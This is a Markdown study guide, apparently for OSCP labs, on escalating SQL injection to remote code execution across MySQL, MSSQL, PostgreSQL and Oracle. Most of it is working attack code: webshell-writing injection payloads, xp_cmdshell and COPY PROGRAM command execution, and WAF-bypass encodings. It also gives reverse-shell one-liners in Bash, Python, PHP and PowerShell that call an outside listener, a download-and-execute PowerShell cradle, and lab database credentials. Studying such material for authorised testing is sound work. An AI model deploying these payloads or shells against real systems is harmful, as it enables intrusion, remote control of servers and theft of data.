# SQL Injection to Code Execution: Complete Guide

## Table of Contents
1. [Overview](#overview)
2. [Enumeration & Discovery Strategies](#enumeration--discovery-strategies)
3. [Manual Code Execution Techniques](#manual-code-execution-techniques)
4. [Attack Chains](#attack-chains)
5. [Automated Exploitation with SQLMap](#automated-exploitation-with-sqlmap)
6. [Alternative Tools & Techniques](#alternative-tools--techniques)
7. [Database System Variations](#database-system-variations)
8. [Real Lab Examples](#real-lab-examples)
9. [Troubleshooting & Optimization](#troubleshooting--optimization)
10. [Quick Reference](#quick-reference)

---

## Overview

SQL injection vulnerabilities can be escalated from data extraction to full Remote Code Execution (RCE) through various database-specific features and misconfigurations. This guide covers comprehensive techniques for achieving code execution through SQL injection across different database systems.

### Prerequisites for SQL to RCE

| Database | Feature | Requirements |
|----------|---------|--------------|
| **MySQL** | INTO OUTFILE | FILE privilege, writable web directory |
| **MSSQL** | xp_cmdshell | sysadmin role or explicit permission |
| **PostgreSQL** | COPY TO/FROM | Superuser or specific permissions |
| **Oracle** | UTL_FILE, Java | CREATE PROCEDURE privilege |

### Attack Surface Matrix

```
SQLi Type         → Code Execution Method       → Shell Type
─────────────────────────────────────────────────────────────
UNION-based       → INTO OUTFILE webshell      → PHP shell
Error-based       → xp_cmdshell                → System shell
Blind (Time)      → Slow extraction → creds    → Direct access
Stacked Queries   → Direct command execution   → Reverse shell
```

---

## Enumeration & Discovery Strategies

### 1. Database Type Identification

#### From Error Messages
```sql
-- MySQL errors
' AND extractvalue(1,concat(0x7e,version()))--
-- Returns: XPATH syntax error: '~5.7.29'

-- MSSQL errors
' AND 1=CONVERT(int,@@version)--
-- Returns: Microsoft SQL Server 2019...

-- PostgreSQL errors
' AND 1=cast(version() as int)--
-- Returns: PostgreSQL 12.2...
```

#### From Behavior Patterns
```bash
# MySQL: Comment styles
--comment
#comment
/*comment*/

# MSSQL: Comment styles
--comment
/*comment*/

# PostgreSQL: Comment styles
--comment
/*comment*/
```

### 2. Privilege Enumeration

#### MySQL Privileges
```sql
-- Check current user
' UNION SELECT user(),null,null--

-- Check FILE privilege
' UNION SELECT grantee,privilege_type,null FROM information_schema.user_privileges WHERE privilege_type='FILE'--

-- Check write permissions
' UNION SELECT @@global.secure_file_priv,null,null--
-- NULL = can write anywhere
-- /var/lib/mysql-files/ = restricted path
-- '' = disabled
```

#### MSSQL Privileges
```sql
-- Check if sysadmin
' AND IS_SRVROLEMEMBER('sysadmin')=1--

-- Check xp_cmdshell status
' AND (SELECT CAST(value_in_use as int) FROM sys.configurations WHERE name='xp_cmdshell')=1--
```

### 3. Finding Writable Directories

#### Web Server Paths
```sql
-- Common writable paths (Linux)
/var/www/html/tmp/
/var/www/html/uploads/
/var/www/html/images/
/tmp/
/var/tmp/

-- Common writable paths (Windows)
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
C:\temp\
```

#### Testing Write Access
```sql
-- MySQL test write
' UNION SELECT 'test',null,null INTO OUTFILE '/var/www/html/tmp/test.txt'--

-- MSSQL test write
'; EXEC xp_cmdshell 'echo test > C:\temp\test.txt'--
```

---

## Manual Code Execution Techniques

### MSSQL: xp_cmdshell

#### Enabling xp_cmdshell
```sql
-- Step 1: Enable advanced options
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Step 2: Enable xp_cmdshell
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Step 3: Execute commands
EXECUTE xp_cmdshell 'whoami';
```

#### Command Execution Payloads
```sql
-- Basic command execution
'; EXEC xp_cmdshell 'dir C:\'--

-- PowerShell execution
'; EXEC xp_cmdshell 'powershell -c "Get-Process"'--

-- Download and execute
'; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.243/shell.ps1'')"'--
```

#### PowerShell Reverse Shell
```sql
-- One-liner reverse shell
'; EXEC xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.243'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'--
```

### MySQL: INTO OUTFILE

#### Writing Webshells
```sql
-- Basic PHP webshell
' UNION SELECT '<?php system($_GET["cmd"]);?>',null,null INTO OUTFILE '/var/www/html/tmp/shell.php'--

-- Advanced PHP webshell with error handling
' UNION SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>',null,null INTO OUTFILE '/var/www/html/tmp/advanced.php'--

-- PHP reverse shell writer
' UNION SELECT '<?php $sock=fsockopen("192.168.45.243",4444);exec("/bin/bash -i <&3 >&3 2>&3");?>',null,null INTO OUTFILE '/var/www/html/tmp/rev.php'--
```

#### Bypassing Restrictions
```sql
-- Using hex encoding
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO OUTFILE '/var/www/html/shell.php'--

-- Using char() function
' UNION SELECT char(60,63,112,104,112,32,115,121,115,116,101,109,40,36,95,71,69,84,91,34,99,109,100,34,93,41,59,63,62) INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL: COPY and Large Objects

```sql
-- Writing files with COPY
COPY (SELECT '<?php system($_GET["cmd"]);?>') TO '/var/www/html/shell.php';

-- Using large objects
SELECT lo_create(1337);
UPDATE pg_largeobject SET data=decode('3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e', 'hex') WHERE loid=1337;
SELECT lo_export(1337, '/var/www/html/shell.php');
```

### Oracle: UTL_FILE and Java

```sql
-- Writing files with UTL_FILE
DECLARE
  file_handle UTL_FILE.FILE_TYPE;
BEGIN
  file_handle := UTL_FILE.FOPEN('/var/www/html/', 'shell.jsp', 'W');
  UTL_FILE.PUT_LINE(file_handle, '<%@ page import="java.io.*" %><%Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));%>');
  UTL_FILE.FCLOSE(file_handle);
END;

-- Java stored procedure for command execution
CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "cmd" AS
import java.io.*;
public class cmd {
  public static String run(String command) throws IOException {
    Process p = Runtime.getRuntime().exec(command);
    // ... handle output
  }
}
```

---

## Attack Chains

### Chain 1: UNION SQLi → Webshell → Reverse Shell → Database Access

**Target**: 192.168.229.19 (MySQL)

```bash
# Step 1: Identify vulnerability and column count
curl -X POST http://$TARGET/search.php -d "item=' ORDER BY 6-- //"
# Error at 6, so 5 columns

# Step 2: Map displayed columns
curl -X POST http://$TARGET/search.php -d "item=' UNION SELECT 'a1','a2','a3','a4','a5'-- //"
# Columns 2-5 displayed

# Step 3: Write webshell
curl -X POST http://$TARGET/search.php \
  -d "item=' UNION SELECT '<?php system(\$_GET[\"cmd\"]);?>', null, null, null, null INTO OUTFILE '/var/www/html/tmp/webshell.php' -- //"

# Step 4: Execute commands
curl "http://$TARGET/tmp/webshell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)

# Step 5: Setup reverse shell
nc -nvlp 4444  # In new terminal

# Step 6: Trigger reverse shell
curl "http://$TARGET/tmp/webshell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.45.243/4444%200%3E%261'"

# Step 7: Upgrade shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
# Enter twice

# Step 8: Find database credentials
cat /var/www/html/db_config.php
# $DBUSER = 'debian-sys-maint';
# $DBPASS = '8atCSO2xmlcxIVWn';

# Step 9: Access database
mysql -u debian-sys-maint -p8atCSO2xmlcxIVWn -e "use offsec; SELECT * FROM users;"
```

### Chain 2: Blind SQLi → SQLMap → OS Shell

```bash
# Step 1: Identify blind SQLi
sqlmap -u "http://$TARGET/blindsqli.php?user=1" -p user --batch

# Step 2: Optimize for time-based
sqlmap -u "http://$TARGET/blindsqli.php?user=1" -p user --technique=T --time-sec=2

# Step 3: Get OS shell
sqlmap -u "http://$TARGET/blindsqli.php?user=1" -p user --os-shell --web-root="/var/www/html/tmp"

# Alternative: Direct database dump (faster than os-shell for data extraction)
sqlmap -u "http://$TARGET/blindsqli.php?user=1" -p user -D offsec -T users --dump --time-sec=1
```

### Chain 3: Authentication Bypass → Admin Access → File Upload

```sql
-- Step 1: Bypass login
Username: admin' OR '1'='1'--
Password: anything

-- Step 2: Access admin panel
-- Find file upload functionality

-- Step 3: Upload webshell
-- Upload: shell.php with system($_GET['cmd'])

-- Step 4: Execute
curl "http://$TARGET/uploads/shell.php?cmd=whoami"
```

---

## Automated Exploitation with SQLMap

### Basic SQLMap Usage

```bash
# Basic detection
sqlmap -u "http://$TARGET/page.php?id=1"

# POST request from file
sqlmap -r request.txt

# Specific parameter
sqlmap -u "http://$TARGET/page.php?id=1" -p id

# Force DBMS
sqlmap -u "http://$TARGET/page.php?id=1" --dbms=mysql
```

### Advanced Techniques

#### OS Shell
```bash
# Basic OS shell
sqlmap -u "http://$TARGET/page.php?id=1" --os-shell

# Specify web root
sqlmap -u "http://$TARGET/page.php?id=1" --os-shell --web-root="/var/www/html"

# For MSSQL
sqlmap -u "http://$TARGET/page.php?id=1" --os-shell --os-cmd="whoami"
```

#### File Operations
```bash
# Read file
sqlmap -u "http://$TARGET/page.php?id=1" --file-read="/etc/passwd"

# Write file
sqlmap -u "http://$TARGET/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/tmp/shell.php"
```

#### Optimization Flags
```bash
# For time-based blind SQLi
--time-sec=2          # Reduce delay time
--technique=T         # Use only time-based
--threads=10          # Multiple threads (careful!)

# Skip unnecessary tests
--skip-waf            # Skip WAF detection
--no-cast             # Turn off payload casting
--no-escape           # Turn off payload escaping

# Performance
--batch               # Never ask for input
--flush-session       # Clear session files
--fresh-queries       # Ignore session file
```

### Creating POST Request File

```bash
# Save Burp request to post.txt
cat > post.txt << 'EOF'
POST /search.php HTTP/1.1
Host: 192.168.229.19
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

item=test
EOF

# Use with sqlmap
sqlmap -r post.txt -p item --dump
```

---

## Alternative Tools & Techniques

### When SQLMap Fails

#### Manual Union Enumeration Script
```python
#!/usr/bin/env python3
import requests

url = "http://192.168.229.19/search.php"
for i in range(1, 20):
    payload = f"' ORDER BY {i}-- //"
    r = requests.post(url, data={"item": payload})
    if "error" in r.text.lower() or "warning" in r.text.lower():
        print(f"Column count: {i-1}")
        break
```

#### Manual Blind Extraction
```python
#!/usr/bin/env python3
import requests
import time

def check_true(payload):
    start = time.time()
    r = requests.get(f"http://192.168.229.19/blindsqli.php?user={payload}")
    return (time.time() - start) > 2

# Extract database name character by character
db_name = ""
for pos in range(1, 20):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
        payload = f"1' AND IF(SUBSTRING(database(),{pos},1)='{char}',SLEEP(3),0)-- //"
        if check_true(payload):
            db_name += char
            print(f"Found: {db_name}")
            break
```

### Leveraging Existing Webshells

```bash
# Check for common webshell names
for shell in shell cmd webshell backdoor c99 r57 c100 php-backdoor; do
    curl -s "http://$TARGET/tmp/$shell.php" | head -1
done

# Check for sqlmap shells (tmpXXXX.php pattern)
curl -s "http://$TARGET/tmp/" | grep -oE 'tmp[a-z0-9]{5}\.php'
```

### Database Credential Hunting

```bash
# Common config file locations
/var/www/html/config.php
/var/www/html/configuration.php
/var/www/html/db_config.php
/var/www/html/database.php
/var/www/html/settings.php
/var/www/html/includes/config.php
/var/www/html/inc/config.php
/var/www/html/conn.php
/var/www/html/connect.php
/var/www/html/.env

# Search from webshell
curl "http://$TARGET/shell.php?cmd=find%20/var/www%20-name%20%22*config*%22%202%3E/dev/null"
curl "http://$TARGET/shell.php?cmd=grep%20-r%20%22mysqli_connect%22%20/var/www/html/"
```

### PHP Info Disclosure

```php
<?php phpinfo(); ?>
// Shows:
// - Server paths
// - PHP version
// - Loaded modules
// - Environment variables
// - Sometimes database credentials
```

---

## Database System Variations

### MySQL/MariaDB Specifics

```sql
-- Version differences
-- MySQL 5.6+: Supports SELECT... INTO OUTFILE
-- MariaDB 10.3+: Additional JSON functions

-- Authentication plugins
-- mysql_native_password: Legacy
-- caching_sha2_password: MySQL 8.0 default
-- auth_socket: Local only

-- Special functions
LOAD_FILE('/etc/passwd')           -- Read files
INTO OUTFILE '/tmp/test.txt'       -- Write files
INTO DUMPFILE '/tmp/binary.bin'    -- Write binary

-- System variables
@@version                           -- Version info
@@datadir                          -- Data directory
@@secure_file_priv                 -- File operation restrictions
@@plugin_dir                       -- Plugin directory
```

### MSSQL Specifics

```sql
-- Versions and features
-- SQL Server 2000: xp_cmdshell enabled by default
-- SQL Server 2005+: xp_cmdshell disabled by default
-- SQL Server 2016+: Enhanced security features

-- Alternative command execution
xp_cmdshell                        -- Direct command execution
sp_OACreate                        -- OLE automation
xp_regwrite                        -- Registry manipulation
sp_execute_external_script         -- R/Python scripts (2016+)

-- PowerShell integration
xp_cmdshell 'powershell -Command "Get-Process"'

-- File operations
BULK INSERT                        -- Read files
OPENROWSET                         -- Read remote files
bcp                               -- Bulk copy utility
```

### PostgreSQL Specifics

```sql
-- Version features
-- 9.3+: COPY TO PROGRAM for command execution
-- 11+: Stored procedures

-- Command execution methods
COPY cmd_output FROM PROGRAM 'id';
CREATE TABLE cmd_output(data text);
COPY cmd_output FROM PROGRAM 'whoami';

-- File operations
COPY (SELECT 'data') TO '/tmp/file.txt';
SELECT pg_read_file('/etc/passwd');
SELECT pg_ls_dir('/var/www/html');

-- Large objects
SELECT lo_import('/etc/passwd');
SELECT lo_export(16385, '/tmp/passwd.txt');
```

### Oracle Specifics

```sql
-- Package permissions required
-- UTL_FILE: File operations
-- UTL_HTTP: HTTP requests
-- DBMS_SCHEDULER: Job scheduling
-- Java: Java stored procedures

-- Command execution via scheduler
BEGIN
  DBMS_SCHEDULER.create_job(
    job_name => 'cmd_job',
    job_type => 'EXECUTABLE',
    job_action => '/bin/bash',
    job_class => 'DEFAULT_JOB_CLASS',
    enabled => TRUE
  );
END;

-- File operations
UTL_FILE.PUT_LINE()               -- Write files
UTL_FILE.GET_LINE()               -- Read files
```

---

## Real Lab Examples

### Lab 1: MySQL UNION to Shell (192.168.229.19)

**Vulnerability**: UNION-based SQLi in search.php

```bash
# Discovery
curl -X POST http://192.168.229.19/search.php -d "item=' ORDER BY 6-- //"
# Error: Unknown column '6' → 5 columns

# Exploitation
curl -X POST http://192.168.229.19/search.php \
  -d "item=' UNION SELECT '<?php system(\$_GET[\"cmd\"]);?>', null, null, null, null INTO OUTFILE '/var/www/html/tmp/webshell.php' -- //"

# Verification
curl "http://192.168.229.19/tmp/webshell.php?cmd=id"
# uid=33(www-data) gid=33(www-data)

# Flag retrieval
curl "http://192.168.229.19/tmp/webshell.php?cmd=ls%20/var/www/html/tmp/"
# flag.txt tmpufazm.php webshell.php

curl "http://192.168.229.19/tmp/webshell.php?cmd=cat%20/var/www/html/tmp/flag.txt"
# OS{5b2f10227af3962e2ec96d8700a18e86}
```

### Lab 2: Blind SQLi to Database Access

**Vulnerability**: Time-based blind SQLi in blindsqli.php

```bash
# Initial detection
sqlmap -u "http://192.168.229.19/blindsqli.php?user=1" -p user --batch
# Confirmed: MySQL >= 5.0.12 AND time-based blind

# Optimization attempt (slow)
sqlmap -u "http://192.168.229.19/blindsqli.php?user=1" -p user -D offsec -T users --dump --time-sec=1

# Alternative: Reverse shell for faster access
# 1. Setup listener
nc -nvlp 4444

# 2. Trigger via webshell
curl "http://192.168.229.19/tmp/webshell.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/192.168.45.243/4444%200%3E%261'"

# 3. Find credentials
cat /var/www/html/db_config.php
# $DBUSER = 'debian-sys-maint';
# $DBPASS = '8atCSO2xmlcxIVWn';

# 4. Query database
mysql -u debian-sys-maint -p8atCSO2xmlcxIVWn -e "use offsec; SELECT * FROM users;"
# Flag in boba user: OS{2cb6049f38144a198193bc867c38d335}
```

### Lab 3: MSSQL xp_cmdshell (192.168.229.18)

```sql
-- Connect
impacket-mssqlclient Administrator:Lab123@192.168.229.18 -windows-auth

-- Enable xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute commands
EXECUTE xp_cmdshell 'whoami';
-- nt service\mssql$sqlexpress

-- Get reverse shell
EXECUTE xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''192.168.45.243'',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
```

---

## Troubleshooting & Optimization

### Common Issues and Solutions

#### Issue: "Access denied for user 'root'@'localhost'"
```bash
# Solution 1: Find correct credentials
find /var/www -name "*.php" -exec grep -l "mysql_connect\|mysqli_connect" {} \;
cat [found_files] | grep -i password

# Solution 2: Try system maintenance user
mysql -u debian-sys-maint -p$(sudo cat /etc/mysql/debian.cnf | grep password | head -1 | cut -d' ' -f3)

# Solution 3: Check for other database users
grep -r "DBUSER\|DBPASS" /var/www/html/
```

#### Issue: "File already exists" with INTO OUTFILE
```sql
-- Solution 1: Use different filename
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/tmp/shell2.php'--

-- Solution 2: Delete via LFI if available
http://target/index.php?page=php://filter/resource=/var/www/html/tmp/webshell.php&delete=1

-- Solution 3: Use time-based name
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE CONCAT('/var/www/html/tmp/shell',UNIX_TIMESTAMP(),'.php')--
```

#### Issue: Time-based blind SQLi too slow
```bash
# Solution 1: Reduce sleep time
--time-sec=1

# Solution 2: Use boolean-based instead
--technique=B

# Solution 3: Multithread (careful!)
--threads=10

# Solution 4: Skip to shell access
# If you can write files, skip data extraction and go straight to shell
```

#### Issue: WAF blocking requests
```sql
-- Encoding bypasses
%27+UNION+SELECT+null--     # URL encoded
%2527+UNION+SELECT+null--   # Double encoded
\u0027+UNION+SELECT+null--  # Unicode

-- Case variations
UnIoN SeLeCt null--
UNION/**/SELECT/**/null--

-- Comment variations
UNION SELECT null--
UNION SELECT null#
UNION SELECT null/*comment*/

-- Using backticks (MySQL)
UNION SELECT `column` FROM `table`--
```

### Performance Optimization

#### For Blind SQLi
```python
# Optimize charset for faster extraction
charset = "etaoinshrdlcumwfgypbvkjxqz0123456789_"  # Ordered by frequency

# Binary search instead of linear
def binary_search_char(position):
    low, high = 0, 127
    while low <= high:
        mid = (low + high) // 2
        payload = f"1' AND ASCII(SUBSTRING(database(),{position},1))>{mid}--"
        if check_true(payload):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low)
```

#### For File Operations
```bash
# Pre-create directory structure
curl "http://$TARGET/shell.php?cmd=mkdir%20-p%20/var/www/html/tmp/myshells"

# Use compression for large files
curl "http://$TARGET/shell.php?cmd=tar%20-czf%20/tmp/backup.tar.gz%20/var/www/html/"
```

---

## Quick Reference

### Decision Tree
```
Start
  ├─ Can inject SQL?
  │   ├─ Yes → What type?
  │   │   ├─ UNION → INTO OUTFILE webshell
  │   │   ├─ Error-based → Extract creds → Login
  │   │   ├─ Blind → SQLMap --os-shell
  │   │   └─ Stacked → xp_cmdshell / COPY PROGRAM
  │   └─ No → Try authentication bypass
  │
  └─ Have file upload?
      ├─ Yes → Upload webshell directly
      └─ No → Find another vector
```

### Copy-Paste Commands

#### MySQL Webshell
```bash
# Write webshell
curl -X POST http://$TARGET/vuln.php -d "param=' UNION SELECT '<?php system(\$_GET[\"cmd\"]);?>', null, null INTO OUTFILE '/var/www/html/tmp/shell.php'-- "

# Execute
curl "http://$TARGET/tmp/shell.php?cmd=id"
```

#### MSSQL Command Execution
```sql
-- Enable and use xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--
```

#### Reverse Shells
```bash
# Bash
bash -c 'bash -i >& /dev/tcp/192.168.45.243/4444 0>&1'

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.243",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("192.168.45.243",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

#### SQLMap Essential
```bash
# Basic scan
sqlmap -u "http://$TARGET/page.php?id=1" --batch --risk=3 --level=5

# POST request
sqlmap -r post.txt -p param --batch

# OS shell
sqlmap -u "http://$TARGET/page.php?id=1" --os-shell --web-root="/var/www/html"

# Optimized blind
sqlmap -u "http://$TARGET/page.php?id=1" --technique=T --time-sec=1 --threads=10
```

### OSCP Exam Tips

1. **Time Management**
   - Try manual exploitation first (5 minutes)
   - Move to SQLMap if manual fails (10 minutes)
   - If blind SQLi, go straight to shell access

2. **Documentation**
   - Screenshot every successful injection
   - Save working payloads immediately
   - Document exact commands used

3. **Efficiency Order**
   - UNION-based (fastest)
   - Error-based (fast)
   - Boolean-based (slow)
   - Time-based (slowest)

4. **Alternative Approaches**
   - If SQLi to RCE fails, try:
     - Authentication bypass → Admin panel → File upload
     - Extract credentials → SSH/RDP access
     - Read configuration files → Find other services

---

## Summary

SQL injection to code execution requires understanding database-specific features, file system permissions, and web server configurations. Key success factors:

1. **Identify the database type** early through error messages or behavior
2. **Check privileges** before attempting file operations
3. **Find writable directories** in the web root
4. **Use automation wisely** - SQLMap for discovery, manual for exploitation
5. **Have backup plans** - Multiple shells, alternative techniques
6. **Document everything** - Working payloads are gold in time-pressured scenarios

Remember: The fastest path to a flag might not be through dumping the database - getting a shell and finding credentials in configuration files is often quicker than extracting data through slow blind SQLi techniques.

---

*Last Updated: SQL Injection to Code Execution - Complete Lab Experience*